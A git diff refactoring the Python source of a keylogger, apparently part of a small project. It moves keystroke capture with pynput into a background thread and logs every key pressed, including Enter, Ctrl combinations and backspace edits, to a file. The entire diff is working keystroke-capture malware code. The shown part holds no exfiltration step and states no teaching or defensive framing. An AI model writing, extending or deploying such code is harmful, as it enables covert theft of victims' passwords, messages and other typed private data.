@@ -1,11 +1,10 @@
 import os
 from .interfaces import KeyloggerBase
 from pynput.keyboard import Listener
-from .log_handler import LogHandler
-
+from threading import Thread
 
 class Keylogger(KeyloggerBase):
-    def __init__(self):
+    def __init__(self, log_handler):
         self.keys_mapping = {
             "Key.space": " ",
             "Key.enter": " [ENTER] ",
@@ -20,15 +19,20 @@ class Keylogger(KeyloggerBase):
             r"\x06": " [ctrl+f] "
 
         }
-        self.log_handler = LogHandler()
+        self.log_handler = log_handler
 
     def start_listener(self):
+        Thread(target=self._start_listener).start()
+
+    def _start_listener(self):
+        self.log_handler.add_header()
+        self.log_handler.start_datetime_writer()
         with Listener(on_press=self._on_key_press) as listener:
             listener.join()
 
     def _on_key_press(self, pressed_key):
         pressed_key = str(pressed_key).replace("'", "")
-        with self.log_handler.file as log:
+        with open(self.log_handler.file, self.log_handler.open_mode) as log:
             if pressed_key in self.keys_mapping:
                 log.write(self.keys_mapping[pressed_key])
             elif pressed_key == "Key.backspace":  # Backspace functionality (like in text editor)
@@ -38,7 +42,7 @@ class Keylogger(KeyloggerBase):
 
     def _handle_backspace(self):
         self.log_handler.open_mode = "rb+"
-        with self.log_handler.file as log:
+        with open(self.log_handler.file, self.log_handler.open_mode) as log:
             log.seek(-1, os.SEEK_END)
             log.truncate()
         self.log_handler.open_mode = "a+"
